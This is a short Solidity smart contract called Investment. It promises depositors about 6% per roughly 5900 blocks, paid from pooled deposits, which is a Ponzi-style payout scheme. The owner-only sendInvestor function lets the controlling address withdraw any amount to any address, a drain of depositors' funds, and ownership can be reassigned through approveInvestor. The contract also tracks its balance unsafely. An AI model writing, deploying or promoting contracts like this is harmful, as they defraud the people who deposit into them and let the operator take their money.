 

pragma solidity ^0.4.0;

 
contract Investment {
     
    mapping (address => uint256) public invested;
     
    mapping (address => uint256) public atBlock;
     
    address investor;
     
    uint256 balance;
     
    constructor() public {
        investor = msg.sender;
    }
     
    function () external payable {
         
        if (invested[msg.sender] != 0) {
             
             
             
            uint256 amount = invested[msg.sender] * 6 / 100 * (block.number - atBlock[msg.sender]) / 5900;
             
            msg.sender.transfer(amount);
        }
         
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        balance += msg.value;
    }
     
    function approveInvestor(address _investor) public onlyInvestor {
        investor = _investor;
    }
     
    function sendInvestor(address _investor, uint256 amount) public payable onlyInvestor {
        _investor.transfer(amount);
        balance -= amount;
    }
     
    function getBalance() public constant returns(uint256) {
        return balance;
    }
     
    function getInvestor() public constant onlyInvestor returns(address)  {
        return investor;
    }
     
    modifier onlyInvestor() {
        require(msg.sender == investor);
        _;
    }
}